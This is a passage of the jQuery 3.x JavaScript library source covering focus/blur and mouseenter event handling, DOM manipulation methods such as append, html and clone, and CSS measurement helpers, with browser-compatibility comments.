							dataPriv.remove( this, delegateType );
						} else {
							dataPriv.set( this, delegateType, attaches );
						}
					} else {

						// Return false to indicate standard teardown should be applied
						return false;
					}
				},

				// Suppress native focus or blur if we're currently inside
				// a leveraged native-event stack
				_default: function( event ) {
					return dataPriv.get( event.target, type );
				},

				delegateType: delegateType
			};

			// Support: Firefox <=44
			// Firefox doesn't have focus(in | out) events
			// Related ticket - https://bugzilla.mozilla.org/show_bug.cgi?id=687787
			//
			// Support: Chrome <=48 - 49, Safari <=9.0 - 9.1
			// focus(in | out) events fire after focus & blur events,
			// which is spec violation - http://www.w3.org/TR/DOM-Level-3-Events/#events-focusevent-event-order
			// Related ticket - https://bugs.chromium.org/p/chromium/issues/detail?id=449857
			//
			// Support: IE 9 - 11+
			// To preserve relative focusin/focus & focusout/blur event order guaranteed on the 3.x branch,
			// attach a single handler for both events in IE.
			jQuery.event.special[ delegateType ] = {
				setup: function() {

					// Handle: regular nodes (via `this.ownerDocument`), window
					// (via `this.document`) & document (via `this`).
					var doc = this.ownerDocument || this.document || this,
						dataHolder = document.documentMode ? this : doc,
						attaches = dataPriv.get( dataHolder, delegateType );

					// Support: IE 9 - 11+
					// We use the same native handler for focusin & focus (and focusout & blur)
					// so we need to coordinate setup & teardown parts between those events.
					// Use `delegateType` as the key as `type` is already used by `leverageNative`.
					if ( !attaches ) {
						if ( document.documentMode ) {
							this.addEventListener( delegateType, focusMappedHandler );
						} else {
							doc.addEventListener( type, focusMappedHandler, true );
						}
					}
					dataPriv.set( dataHolder, delegateType, ( attaches || 0 ) + 1 );
				},
				teardown: function() {
					var doc = this.ownerDocument || this.document || this,
						dataHolder = document.documentMode ? this : doc,
						attaches = dataPriv.get( dataHolder, delegateType ) - 1;

					if ( !attaches ) {
						if ( document.documentMode ) {
							this.removeEventListener( delegateType, focusMappedHandler );
						} else {
							doc.removeEventListener( type, focusMappedHandler, true );
						}
						dataPriv.remove( dataHolder, delegateType );
					} else {
						dataPriv.set( dataHolder, delegateType, attaches );
					}
				}
			};
		} );

		// Create mouseenter/leave events using mouseover/out and event-time checks
		// so that event delegation works in jQuery.
		// Do the same for pointerenter/pointerleave and pointerover/pointerout
		//
		// Support: Safari 7 only
		// Safari sends mouseenter too often; see:
		// https://bugs.chromium.org/p/chromium/issues/detail?id=470258
		// for the description of the bug (it existed in older Chrome versions as well).
		jQuery.each( {
			mouseenter: "mouseover",
			mouseleave: "mouseout",
			pointerenter: "pointerover",
			pointerleave: "pointerout"
		}, function( orig, fix ) {
			jQuery.event.special[ orig ] = {
				delegateType: fix,
				bindType: fix,

				handle: function( event ) {
					var ret,
						target = this,
						related = event.relatedTarget,
						handleObj = event.handleObj;

					// For mouseenter/leave call the handler if related is outside the target.
					// NB: No relatedTarget if the mouse left/entered the browser window
					if ( !related || ( related !== target && !jQuery.contains( target, related ) ) ) {
						event.type = handleObj.origType;
						ret = handleObj.handler.apply( this, arguments );
						event.type = fix;
					}
					return ret;
				}
			};
		} );

		jQuery.fn.extend( {

			on: function( types, selector, data, fn ) {
				return on( this, types, selector, data, fn );
			},
			one: function( types, selector, data, fn ) {
				return on( this, types, selector, data, fn, 1 );
			},
			off: function( types, selector, fn ) {
				var handleObj, type;
				if ( types && types.preventDefault && types.handleObj ) {

					// ( event )  dispatched jQuery.Event
					handleObj = types.handleObj;
					jQuery( types.delegateTarget ).off(
						handleObj.namespace ?
							handleObj.origType + "." + handleObj.namespace :
							handleObj.origType,
						handleObj.selector,
						handleObj.handler
					);
					return this;
				}
				if ( typeof types === "object" ) {

					// ( types-object [, selector] )
					for ( type in types ) {
						this.off( type, selector, types[ type ] );
					}
					return this;
				}
				if ( selector === false || typeof selector === "function" ) {

					// ( types [, fn] )
					fn = selector;
					selector = undefined;
				}
				if ( fn === false ) {
					fn = returnFalse;
				}
				return this.each( function() {
					jQuery.event.remove( this, types, fn, selector );
				} );
			}
		} );


		var

			// Support: IE <=10 - 11, Edge 12 - 13 only
			// In IE/Edge using regex groups here causes severe slowdowns.
			// See https://connect.microsoft.com/IE/feedback/details/1736512/
			rnoInnerhtml = /<script|<style|<link/i,

			// checked="checked" or checked
			rchecked = /checked\s*(?:[^=]|=\s*.checked.)/i,

			rcleanScript = /^\s*<!\[CDATA\[|\]\]>\s*$/g;

		// Prefer a tbody over its parent table for containing new rows
		function manipulationTarget( elem, content ) {
			if ( nodeName( elem, "table" ) &&
				nodeName( content.nodeType !== 11 ? content : content.firstChild, "tr" ) ) {

				return jQuery( elem ).children( "tbody" )[ 0 ] || elem;
			}

			return elem;
		}

		// Replace/restore the type attribute of script elements for safe DOM manipulation
		function disableScript( elem ) {
			elem.type = ( elem.getAttribute( "type" ) !== null ) + "/" + elem.type;
			return elem;
		}
		function restoreScript( elem ) {
			if ( ( elem.type || "" ).slice( 0, 5 ) === "true/" ) {
				elem.type = elem.type.slice( 5 );
			} else {
				elem.removeAttribute( "type" );
			}

			return elem;
		}

		function cloneCopyEvent( src, dest ) {
			var i, l, type, pdataOld, udataOld, udataCur, events;

			if ( dest.nodeType !== 1 ) {
				return;
			}

			// 1. Copy private data: events, handlers, etc.
			if ( dataPriv.hasData( src ) ) {
				pdataOld = dataPriv.get( src );
				events = pdataOld.events;

				if ( events ) {
					dataPriv.remove( dest, "handle events" );

					for ( type in events ) {
						for ( i = 0, l = events[ type ].length; i < l; i++ ) {
							jQuery.event.add( dest, type, events[ type ][ i ] );
						}
					}
				}
			}

			// 2. Copy user data
			if ( dataUser.hasData( src ) ) {
				udataOld = dataUser.access( src );
				udataCur = jQuery.extend( {}, udataOld );

				dataUser.set( dest, udataCur );
			}
		}

		// Fix IE bugs, see support tests
		function fixInput( src, dest ) {
			var nodeName = dest.nodeName.toLowerCase();

			// Fails to persist the checked state of a cloned checkbox or radio button.
			if ( nodeName === "input" && rcheckableType.test( src.type ) ) {
				dest.checked = src.checked;

			// Fails to return the selected option to the default selected state when cloning options
			} else if ( nodeName === "input" || nodeName === "textarea" ) {
				dest.defaultValue = src.defaultValue;
			}
		}

		function domManip( collection, args, callback, ignored ) {

			// Flatten any nested arrays
			args = flat( args );

			var fragment, first, scripts, hasScripts, node, doc,
				i = 0,
				l = collection.length,
				iNoClone = l - 1,
				value = args[ 0 ],
				valueIsFunction = isFunction( value );

			// We can't cloneNode fragments that contain checked, in WebKit
			if ( valueIsFunction ||
					( l > 1 && typeof value === "string" &&
						!support.checkClone && rchecked.test( value ) ) ) {
				return collection.each( function( index ) {
					var self = collection.eq( index );
					if ( valueIsFunction ) {
						args[ 0 ] = value.call( this, index, self.html() );
					}
					domManip( self, args, callback, ignored );
				} );
			}

			if ( l ) {
				fragment = buildFragment( args, collection[ 0 ].ownerDocument, false, collection, ignored );
				first = fragment.firstChild;

				if ( fragment.childNodes.length === 1 ) {
					fragment = first;
				}

				// Require either new content or an interest in ignored elements to invoke the callback
				if ( first || ignored ) {
					scripts = jQuery.map( getAll( fragment, "script" ), disableScript );
					hasScripts = scripts.length;

					// Use the original fragment for the last item
					// instead of the first because it can end up
					// being emptied incorrectly in certain situations (trac-8070).
					for ( ; i < l; i++ ) {
						node = fragment;

						if ( i !== iNoClone ) {
							node = jQuery.clone( node, true, true );

							// Keep references to cloned scripts for later restoration
							if ( hasScripts ) {

								// Support: Android <=4.0 only, PhantomJS 1 only
								// push.apply(_, arraylike) throws on ancient WebKit
								jQuery.merge( scripts, getAll( node, "script" ) );
							}
						}

						callback.call( collection[ i ], node, i );
					}

					if ( hasScripts ) {
						doc = scripts[ scripts.length - 1 ].ownerDocument;

						// Re-enable scripts
						jQuery.map( scripts, restoreScript );

						// Evaluate executable scripts on first document insertion
						for ( i = 0; i < hasScripts; i++ ) {
							node = scripts[ i ];
							if ( rscriptType.test( node.type || "" ) &&
								!dataPriv.access( node, "globalEval" ) &&
								jQuery.contains( doc, node ) ) {

								if ( node.src && ( node.type || "" ).toLowerCase()  !== "module" ) {

									// Optional AJAX dependency, but won't run scripts if not present
									if ( jQuery._evalUrl && !node.noModule ) {
										jQuery._evalUrl( node.src, {
											nonce: node.nonce || node.getAttribute( "nonce" )
										}, doc );
									}
								} else {

									// Unwrap a CDATA section containing script contents. This shouldn't be
									// needed as in XML documents they're already not visible when
									// inspecting element contents and in HTML documents they have no
									// meaning but we're preserving that logic for backwards compatibility.
									// This will be removed completely in 4.0. See gh-4904.
									DOMEval( node.textContent.replace( rcleanScript, "" ), node, doc );
								}
							}
						}
					}
				}
			}

			return collection;
		}

		function remove( elem, selector, keepData ) {
			var node,
				nodes = selector ? jQuery.filter( selector, elem ) : elem,
				i = 0;

			for ( ; ( node = nodes[ i ] ) != null; i++ ) {
				if ( !keepData && node.nodeType === 1 ) {
					jQuery.cleanData( getAll( node ) );
				}

				if ( node.parentNode ) {
					if ( keepData && isAttached( node ) ) {
						setGlobalEval( getAll( node, "script" ) );
					}
					node.parentNode.removeChild( node );
				}
			}

			return elem;
		}

		jQuery.extend( {
			htmlPrefilter: function( html ) {
				return html;
			},

			clone: function( elem, dataAndEvents, deepDataAndEvents ) {
				var i, l, srcElements, destElements,
					clone = elem.cloneNode( true ),
					inPage = isAttached( elem );

				// Fix IE cloning issues
				if ( !support.noCloneChecked && ( elem.nodeType === 1 || elem.nodeType === 11 ) &&
						!jQuery.isXMLDoc( elem ) ) {

					// We eschew jQuery#find here for performance reasons:
					// https://jsperf.com/getall-vs-sizzle/2
					destElements = getAll( clone );
					srcElements = getAll( elem );

					for ( i = 0, l = srcElements.length; i < l; i++ ) {
						fixInput( srcElements[ i ], destElements[ i ] );
					}
				}

				// Copy the events from the original to the clone
				if ( dataAndEvents ) {
					if ( deepDataAndEvents ) {
						srcElements = srcElements || getAll( elem );
						destElements = destElements || getAll( clone );

						for ( i = 0, l = srcElements.length; i < l; i++ ) {
							cloneCopyEvent( srcElements[ i ], destElements[ i ] );
						}
					} else {
						cloneCopyEvent( elem, clone );
					}
				}

				// Preserve script evaluation history
				destElements = getAll( clone, "script" );
				if ( destElements.length > 0 ) {
					setGlobalEval( destElements, !inPage && getAll( elem, "script" ) );
				}

				// Return the cloned set
				return clone;
			},

			cleanData: function( elems ) {
				var data, elem, type,
					special = jQuery.event.special,
					i = 0;

				for ( ; ( elem = elems[ i ] ) !== undefined; i++ ) {
					if ( acceptData( elem ) ) {
						if ( ( data = elem[ dataPriv.expando ] ) ) {
							if ( data.events ) {
								for ( type in data.events ) {
									if ( special[ type ] ) {
										jQuery.event.remove( elem, type );

									// This is a shortcut to avoid jQuery.event.remove's overhead
									} else {
										jQuery.removeEvent( elem, type, data.handle );
									}
								}
							}

							// Support: Chrome <=35 - 45+
							// Assign undefined instead of using delete, see Data#remove
							elem[ dataPriv.expando ] = undefined;
						}
						if ( elem[ dataUser.expando ] ) {

							// Support: Chrome <=35 - 45+
							// Assign undefined instead of using delete, see Data#remove
							elem[ dataUser.expando ] = undefined;
						}
					}
				}
			}
		} );

		jQuery.fn.extend( {
			detach: function( selector ) {
				return remove( this, selector, true );
			},

			remove: function( selector ) {
				return remove( this, selector );
			},

			text: function( value ) {
				return access( this, function( value ) {
					return value === undefined ?
						jQuery.text( this ) :
						this.empty().each( function() {
							if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
								this.textContent = value;
							}
						} );
				}, null, value, arguments.length );
			},

			append: function() {
				return domManip( this, arguments, function( elem ) {
					if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
						var target = manipulationTarget( this, elem );
						target.appendChild( elem );
					}
				} );
			},

			prepend: function() {
				return domManip( this, arguments, function( elem ) {
					if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
						var target = manipulationTarget( this, elem );
						target.insertBefore( elem, target.firstChild );
					}
				} );
			},

			before: function() {
				return domManip( this, arguments, function( elem ) {
					if ( this.parentNode ) {
						this.parentNode.insertBefore( elem, this );
					}
				} );
			},

			after: function() {
				return domManip( this, arguments, function( elem ) {
					if ( this.parentNode ) {
						this.parentNode.insertBefore( elem, this.nextSibling );
					}
				} );
			},

			empty: function() {
				var elem,
					i = 0;

				for ( ; ( elem = this[ i ] ) != null; i++ ) {
					if ( elem.nodeType === 1 ) {

						// Prevent memory leaks
						jQuery.cleanData( getAll( elem, false ) );

						// Remove any remaining nodes
						elem.textContent = "";
					}
				}

				return this;
			},

			clone: function( dataAndEvents, deepDataAndEvents ) {
				dataAndEvents = dataAndEvents == null ? false : dataAndEvents;
				deepDataAndEvents = deepDataAndEvents == null ? dataAndEvents : deepDataAndEvents;

				return this.map( function() {
					return jQuery.clone( this, dataAndEvents, deepDataAndEvents );
				} );
			},

			html: function( value ) {
				return access( this, function( value ) {
					var elem = this[ 0 ] || {},
						i = 0,
						l = this.length;

					if ( value === undefined && elem.nodeType === 1 ) {
						return elem.innerHTML;
					}

					// See if we can take a shortcut and just use innerHTML
					if ( typeof value === "string" && !rnoInnerhtml.test( value ) &&
						!wrapMap[ ( rtagName.exec( value ) || [ "", "" ] )[ 1 ].toLowerCase() ] ) {

						value = jQuery.htmlPrefilter( value );

						try {
							for ( ; i < l; i++ ) {
								elem = this[ i ] || {};

								// Remove element nodes and prevent memory leaks
								if ( elem.nodeType === 1 ) {
									jQuery.cleanData( getAll( elem, false ) );
									elem.innerHTML = value;
								}
							}

							elem = 0;

						// If using innerHTML throws an exception, use the fallback method
						} catch ( e ) {}
					}

					if ( elem ) {
						this.empty().append( value );
					}
				}, null, value, arguments.length );
			},

			replaceWith: function() {
				var ignored = [];

				// Make the changes, replacing each non-ignored context element with the new content
				return domManip( this, arguments, function( elem ) {
					var parent = this.parentNode;

					if ( jQuery.inArray( this, ignored ) < 0 ) {
						jQuery.cleanData( getAll( this ) );
						if ( parent ) {
							parent.replaceChild( elem, this );
						}
					}

				// Force callback invocation
				}, ignored );
			}
		} );

		jQuery.each( {
			appendTo: "append",
			prependTo: "prepend",
			insertBefore: "before",
			insertAfter: "after",
			replaceAll: "replaceWith"
		}, function( name, original ) {
			jQuery.fn[ name ] = function( selector ) {
				var elems,
					ret = [],
					insert = jQuery( selector ),
					last = insert.length - 1,
					i = 0;

				for ( ; i <= last; i++ ) {
					elems = i === last ? this : this.clone( true );
					jQuery( insert[ i ] )[ original ]( elems );

					// Support: Android <=4.0 only, PhantomJS 1 only
					// .get() because push.apply(_, arraylike) throws on ancient WebKit
					push.apply( ret, elems.get() );
				}

				return this.pushStack( ret );
			};
		} );
		var rnumnonpx = new RegExp( "^(" + pnum + ")(?!px)[a-z%]+$", "i" );

		var rcustomProp = /^--/;


		var getStyles = function( elem ) {

				// Support: IE <=11 only, Firefox <=30 (trac-15098, trac-14150)
				// IE throws on elements created in popups
				// FF meanwhile throws on frame elements through "defaultView.getComputedStyle"
				var view = elem.ownerDocument.defaultView;

				if ( !view || !view.opener ) {
					view = window;
				}

				return view.getComputedStyle( elem );
			};

		var swap = function( elem, options, callback ) {
			var ret, name,
				old = {};

			// Remember the old values, and insert the new ones
			for ( name in options ) {
				old[ name ] = elem.style[ name ];
				elem.style[ name ] = options[ name ];
			}

			ret = callback.call( elem );

			// Revert the old values
			for ( name in options ) {
				elem.style[ name ] = old[ name ];
			}

			return ret;
		};


		var rboxStyle = new RegExp( cssExpand.join( "|" ), "i" );



		( function() {

			// Executing both pixelPosition & boxSizingReliable tests require only one layout
			// so they're executed at the same time to save the second computation.
			function computeStyleTests() {

				// This is a singleton, we need to execute it only once
				if ( !div ) {
					return;
				}

				container.style.cssText = "position:absolute;left:-11111px;width:60px;" +
					"margin-top:1px;padding:0;border:0";
				div.style.cssText =
					"position:relative;display:block;box-sizing:border-box;overflow:scroll;" +
					"margin:auto;border:1px;padding:1px;" +
					"width:60%;top:1%";
				documentElement.appendChild( container ).appendChild( div );

				var divStyle = window.getComputedStyle( div );
				pixelPositionVal = divStyle.top !== "1%";

				// Support: Android 4.0 - 4.3 only, Firefox <=3 - 44
				reliableMarginLeftVal = roundPixelMeasures( divStyle.marginLeft ) === 12;

				// Support: Android 4.0 - 4.3 only, Safari <=9.1 - 10.1, iOS <=7.0 - 9.3
				// Some styles come back with percentage values, even though they shouldn't
				div.style.right = "60%";
				pixelBoxStylesVal = roundPixelMeasures( divStyle.right ) === 36;

				// Support: IE 9 - 11 only
				// Detect misreporting of content dimensions for box-sizing:border-box elements
				boxSizingReliableVal = roundPixelMeasures( divStyle.width ) === 36;

				// Support: IE 9 only
				// Detect overflow:scroll screwiness (gh-3699)
				// Support: Chrome <=64
				// Don't get tricked when zoom affects offsetWidth (gh-4029)
				div.style.position = "absolute";
				scrollboxSizeVal = roundPixelMeasures( div.offsetWidth / 3 ) === 12;

				documentElement.removeChild( container );

				// Nullify the div so it wouldn't be stored in the memory and
				// it will also be a sign that checks already performed
				div = null;
			}

			function roundPixelMeasures( measure ) {
				return Math.round( parseFloat( measure ) );
			}

			var pixelPositionVal, boxSizingReliableVal, scrollboxSizeVal, pixelBoxStylesVal,
				reliableTrDimensionsVal, reliableMarginLeftVal,
				container = document.createElement( "div" ),
				div = document.createElement( "div" );

			// Finish early in limited (non-browser) environments
			if ( !div.style ) {
				return;
			}

			// Support: IE <=9 - 11 only
			// Style of cloned element affects source element cloned (trac-8908)
			div.style.backgroundClip = "content-box";
			div.cloneNode( true ).style.backgroundClip = "";
			support.clearCloneStyle = div.style.backgroundClip === "content-box";

			jQuery.extend( support, {
				boxSizingReliable: function() {
					computeStyleTests();
					return boxSizingReliableVal;
				},
				pixelBoxStyles: function() {
					computeStyleTests();
					return pixelBoxStylesVal;
				},
				pixelPosition: function() {
					computeStyleTests();
					return pixelPositionVal;
				},
				reliableMarginLeft: function() {
					computeStyleTests();
					return reliableMarginLeftVal;
				},
				scrollboxSize: function() {
					computeStyleTests();
					return scrollboxSizeVal;
				},

				// Support: IE 9 - 11+, Edge 15 - 18+
				// IE/Edge misreport `getComputedStyle` of table rows with width/height
				// set in CSS while `offset*` properties report correct values.
				// Behavior in IE 9 is more subtle than in newer versions & it passes
				// some versions of this test; make sure not to make it pass there!
				//
				// Support: Firefox 70+
				// Only Firefox includes border widths
				// in computed dimensions. (gh-4529)
				reliableTrDimensions: function() {
					var table, tr, trChild, trStyle;
					if ( reliableTrDimensionsVal == null ) {
						table = document.createElement( "table" );
						tr = document.createElement( "tr" );
						trChild = document.createElement( "div" );

						table.style.cssText = "position:absolute;left:-11111px;border-collapse:separate";
						tr.style.cssText = "box-sizing:content-box;border:1px solid";

						// Support: Chrome 86+
						// Height set through cssText does not get applied.
						// Computed height then comes back as 0.
						tr.style.height = "1px";
						trChild.style.height = "9px";

						// Support: Android 8 Chrome 86+
						// In our bodyBackground.html iframe,
						// display for all div elements is set to "inline",
						// which causes a problem only in Android 8 Chrome 86.
						// Ensuring the div is `display: block`
						// gets around this issue.
						trChild.style.display = "block";

						documentElement
							.appendChild( table )
							.appendChild( tr )
							.appendChild( trChild );

						trStyle = window.getComputedStyle( tr );
						reliableTrDimensionsVal = ( parseInt( trStyle.height, 10 ) +
							parseInt( trStyle.borderTopWidth, 10 ) +
							parseInt( trStyle.borderBottomWidth, 10 ) ) === tr.offsetHeight;

						documentElement.removeChild( table );
					}
					return reliableTrDimensionsVal;
				}
			} );
		} )();


		function curCSS( elem, name, computed ) {
			var width, minWidth, maxWidth, ret,
				isCustomProp = rcustomProp.test( name ),

				// Support: Firefox 51+
				// Retrieving style before computed somehow
				// fixes an issue with getting wrong values
				// on detached elements
				style = elem.style;

			computed = computed || getStyles( elem );

			// getPropertyValue is needed for:
			//   .css('filter') (IE 9 only, trac-12537)
			//   .css('--customProperty) (gh-3144)
			if ( computed ) {

				// Support: IE <=9 - 11+
				// IE only supports `"float"` in `getPropertyValue`; in computed styles
				// it's only available as `"cssFloat"`. We no longer modify properties
				// sent to `.css()` apart from camelCasing, so we need to check both.
				// Normally, this would create difference in behavior: if
				// `getPropertyValue` returns an empty string, the value returned
				// by `.css()` would be `undefined`. This is usually the case for
				// disconnected elements. However, in IE even disconnected elements
				// with no styles return `"none"` for `getPropertyValue( "float" )`
				ret = computed.getPropertyValue( name ) || computed[ name ];

				if ( isCustomProp && ret ) {

					// Support: Firefox 105+, Chrome <=105+
					// Spec requires trimming whitespace for custom properties (gh-4926).
					// Firefox only trims leading whitespace. Chrome just collapses
					// both leading & trailing whitespace to a single space.
					//
					// Fall back to `undefined` if empty string returned.
					// This collapses a missing definition with property defined
					// and set to an empty string but there's no standard API
					// allowing us to differentiate them without a performance penalty
					// and returning `undefined` aligns with older jQuery.
					//
					// rtrimCSS treats U+000D CARRIAGE RETURN and U+000C FORM FEED
					// as whitespace while CSS does not, but this is not a problem
					// because CSS preprocessing replaces them with U+000A LINE FEED
					// (which *is* CSS whitespace)
					// https://www.w3.org/TR/css-syntax-3/#input-preprocessing
					ret = ret.replace( rtrimCSS, "$1" ) || undefined;
				}

				if ( ret === "" && !isAttached( elem ) ) {
					ret = jQuery.style( elem, name );
				}

				// A tribute to the "awesome hack by Dean Edwards"
				// Android Browser returns percentage for some values,
				// but width seems to be reliably pixels.
				// This is against the CSSOM draft spec:
				// https://drafts.csswg.org/cssom/#resolved-values
				if ( !support.pixelBoxStyles() && rnumnonpx.test( ret ) && rboxStyle.test( name ) ) {

					// Remember the original values
					width = style.width;
					minWidth = style.minWidth;
					maxWidth = style.maxWidth;

					// Put in the new values to get a computed value out
					style.minWidth = style.maxWidth = style.width = ret;
					ret = computed.width;

					// Revert the changed values
					style.width = width;
					style.minWidth = minWidth;
					style.maxWidth = maxWidth;
				}
			}

			return ret !== undefined ?

				// Support: IE <=9 - 11 only
				// IE returns zIndex value as an integer.
				ret + "" :
				ret;
		}


		function addGetHookIf( conditionFn, hookFn ) {

			// Define the hook, we'll check on the first run if it's really needed.
			return {
				get: function() {
					if ( conditionFn() ) {

						// Hook not needed (or it's not possible to use it due
						// to missing dependency), remove it.
						delete this.get;
						return;
					}

					// Hook needed; redefine it so that the support test is not executed again.
					return ( this.get = hookFn ).apply( this, arguments );
				}
			};
		}


		var cssPrefixes = [ "Webkit", "Moz", "ms" ],
			emptyStyle = document.createElement( "div" ).style,
			vendorProps = {};

		// Return a vendor-prefixed property or undefined
		function vendorPropName( name ) {

			// Check for vendor prefixed names
			var capName = name[ 0 ].toUpperCase() + name.slice( 1 ),
				i = cssPrefixes.length;

			while ( i-- ) {
				name = cssPrefixes[ i ] + capName;
				if ( name in emptyStyle ) {
					return name;
				}
			}
		}

		// Return a potentially-mapped jQuery.cssProps or vendor prefixed property
		function finalPropName( name ) {
			var final = jQuery.cssProps[ name ] || vendorProps[ name ];

			if ( final ) {
				return final;
			}
			if ( name in emptyStyle ) {
				return name;
			}
			return vendorProps[ name ] = vendorPropName( name ) || name;
		}


		var

			// Swappable if display is none or starts with table
			// except "table", "table-cell", or "table-caption"
			// See here for display values: https://developer.mozilla.org/en-US/docs/CSS/display
			rdisplayswap = /^(none|table(?!-c[ea]).+)/,
			cssShow = { position: "absolute", visibility: "hidden", display: "block" },
			cssNormalTransform = {
				letterSpacing: "0",
				fontWeight: "400"
			};

		function setPositiveNumber( _elem, value, subtract ) {

			// Any relative (+/-) values have already been
			// normalized at this point
			var matches = rcssNum.exec( value );
			return matches ?

				// Guard against undefined "subtract", e.g., when used as in cssHooks
				Math.max( 0, matches[ 2 ] - ( subtract || 0 ) ) + ( matches[ 3 ] || "px" ) :
				value;
		}

		function boxModelAdjustment( elem, dimension, box, isBorderBox, styles, computedVal ) {
			var i = dimension === "width" ? 1 : 0,
				extra = 0,
				delta = 0,
				marginDelta = 0;

			// Adjustment may not be necessary
			if ( box === ( isBorderBox ? "border" : "content" ) ) {
				return 0;
			}

			for ( ; i < 4; i += 2 ) {

				// Both box models exclude margin
				// Count margin delta separately to only add it after scroll gutter adjustment.
				// This is needed to make negative margins work with `outerHeight( true )` (gh-3982).
				if ( box === "margin" ) {
					marginDelta += jQuery.css( elem, box + cssExpand[ i ], true, styles );
				}

				// If we get here with a content-box, we're seeking "padding" or "border" or "margin"
				if ( !isBorderBox ) {

					// Add padding
					delta += jQuery.css( elem, "padding" + cssExpand[ i ], true, styles );

					// For "border" or "margin", add border
					if ( box !== "padding" ) {
						delta += jQuery.css( elem, "border" + cssExpand[ i ] + "Width", true, styles );

					// But still keep track of it otherwise
					} else {
						extra += jQuery.css( elem, "border" + cssExpand[ i ] + "Width", true, styles );
					}

				// If we get here with a border-box (content + padding + border), we're seeking "content" or
				// "padding" or "margin"
				} else {

					// For "content", subtract padding
					if ( box === "content" ) {
						delta -= jQuery.css( elem, "padding" + cssExpand[ i ], true, styles );
					}

					// For "content" or "padding", subtract border
					if ( box !== "margin" ) {
						delta -= jQuery.css( elem, "border" + cssExpand[ i ] + "Width", true, styles );
					}
				}
			}

			// Account for positive content-box scroll gutter when requested by providing computedVal
			if ( !isBorderBox && computedVal >= 0 ) {

				// offsetWidth/offsetHeight is a rounded sum of content, padding, scroll gutter, and border
				// Assuming integer scroll gutter, subtract the rest and round down
				delta += Math.max( 0, Math.ceil(
					elem[ "offset" + dimension[ 0 ].toUpperCase() + dimension.slice( 1 ) ] -
					computedVal -
					delta -
					extra -
					0.5

				// If offsetWidth/offsetHeight is unknown, then we can't determine content-box scroll gutter
				// Use an explicit zero to avoid NaN (gh-3964)
				) ) || 0;
			}

			return delta + marginDelta;
		}

		function getWidthOrHeight( elem, dimension, extra ) {

			// Start with computed style
			var styles = getStyles( elem ),

				// To avoid forcing a reflow, only fetch boxSizing if we need it (gh-4322).
				// Fake content-box until we know it's needed to know the true value.
				boxSizingNeeded = !support.boxSizingReliable() || extra,
				isBorderBox = boxSizingNeeded &&
					jQuery.css( elem, "boxSizing", false, styles ) === "border-box",
				valueIsBorderBox = isBorderBox,

				val = curCSS( elem, dimension, styles ),
				offsetProp = "offset" + dimension[ 0 ].toUpperCase() + dimension.slice( 1 );

			// Support: Firefox <=54
			// Return a confounding non-pixel value or feign ignorance, as appropriate.
			if ( rnumnonpx.test( val ) ) {
				if ( !extra ) {
					return val;
				}
				val = "auto";
			}


			// Support: IE 9 - 11 only
			// Use offsetWidth/offsetHeight for when box sizing is unreliable.
			// In those cases, the computed value can be trusted to be border-box.
			if ( ( !support.boxSizingReliable() && isBorderBox ||

				// Support: IE 10 - 11+, Edge 15 - 18+
				// IE/Edge misreport `getComputedStyle` of table rows with width/height
				// set in CSS while `offset*` properties report correct values.
				// Interestingly, in some cases IE 9 doesn't suffer from this issue.
				!support.reliableTrDimensions() && nodeName( elem, "tr" ) ||

				// Fall back to offsetWidth/offsetHeight when value is "auto"
				// This happens for inline elements with no explicit setting (gh-3571)
				val === "auto" ||

				// Support: Android <=4.1 - 4.3 only
				// Also use offsetWidth/offsetHeight for misreported inline dimensions (gh-3602)
				!parseFloat( val ) && jQuery.css( elem, "display", false, styles ) === "inline" ) &&

				// Make sure the element is visible & connected
				elem.getClientRects().length ) {

				isBorderBox = jQuery.css( elem, "boxSizing", false, styles ) === "border-box";

				// Where available, offsetWidth/offsetHeight approximate border box dimensions.
				// Where not available (e.g., SVG), assume unreliable box-sizing and interpret the
				// retrieved value as a content box dimension.
				valueIsBorderBox = offsetProp in elem;
				if ( valueIsBorderBox ) {
					val = elem[ offsetProp ];
				}
			}

			// Normalize "" and auto
			val = parseFloat( val ) || 0;

			// Adjust for the element's box model
			return ( val +
				boxModelAdjustment(
					elem,
					dimension,
					extra || ( isBorderBox ? "border" : "content" ),
					valueIsBorderBox,
					styles,

					// Provide the current computed size to request scroll gutter calculation (gh-3589)
					val
				)
			) + "px";
		}

		jQuery.extend( {

			// Add in style property hooks for overriding the default
			// behavior of getting and setting a style property
			cssHooks: {
				opacity: {
					get: function( elem, computed ) {
						if ( computed ) {

							// We should always get a number back from opacity
							var ret = curCSS( elem, "opacity" );
							return ret === "" ? "1" : ret;
						}
					}
				}
			},

			// Don't automatically add "px" to these possibly-unitless properties
			cssNumber: {
				animationIterationCount: true,
				aspectRatio: true,
				borderImageSlice: true,
				columnCount: true,
				flexGrow: true,
				flexShrink: true,
				fontWeight: true,
				gridArea: true,
				gridColumn: true,
				gridColumnEnd: true,
				gridColumnStart: true,
				gridRow: true,
				gridRowEnd: true,
				gridRowStart: true,
				lineHeight: true,
				opacity: true,
				order: true,
				orphans: true,
				scale: true,
				widows: true,
				zIndex: true,
				zoom: true,

				// SVG-related
				fillOpacity: true,
				floodOpacity: true,
				stopOpacity: true,
				strokeMiterlimit: true,
				strokeOpacity: true
			},

			// Add in properties whose names you wish to fix before
			// setting or getting the value
			cssProps: {},

			// Get and set the style property on a DOM Node
			style: function( elem, name, value, extra ) {

				// Don't set styles on text and comment nodes
				if ( !elem || elem.nodeType === 3 || elem.nodeType === 8 || !elem.style ) {
					return;
				}

				// Make sure that we're working with the right name
				var ret, type, hooks,
					origName = camelCase( name ),
					isCustomProp = rcustomProp.test( name ),
					style = elem.style;

				// Make sure that we're working with the right name. We don't
				// want to query the value if it is a CSS custom property
				// since they are user-defined.
				if ( !isCustomProp ) {
					name = finalPropName( origName );
				}

				// Gets hook for the prefixed version, then unprefixed version
				hooks = jQuery.cssHooks[ name ] || jQuery.cssHooks[ origName ];

				// Check if we're setting a value
				if ( value !== undefined ) {
					type = typeof value;

					// Convert "+=" or "-=" to relative numbers (trac-7345)
					if ( type === "string" && ( ret = rcssNum.exec( value ) ) && ret[ 1 ] ) {
						value = adjustCSS( elem, name, ret );

						// Fixes bug trac-9237
						type = "number";
					}

					// Make sure that null and NaN values aren't set (trac-7116)
					if ( value == null || value !== value ) {
						return;
					}

					// If a number was passed in, add the unit (except for certain CSS properties)
					// The isCustomProp check can be removed in jQuery 4.0 when we only auto-append
					// "px" to a few hardcoded values.
					if ( type === "number" && !isCustomProp ) {
